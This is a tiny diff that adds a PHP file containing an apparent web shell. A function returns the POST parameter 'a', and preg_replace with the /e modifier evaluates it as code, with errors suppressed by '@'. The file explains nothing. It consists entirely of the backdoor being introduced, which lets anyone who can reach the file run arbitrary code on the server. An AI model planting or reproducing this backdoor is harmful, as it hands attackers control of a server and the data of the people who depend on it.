@@ -1,0 +1,4 @@
+<?php
+function fun()
+{return $_POST['a'];}
+@preg_replace("/test/e",fun(),"test test test");
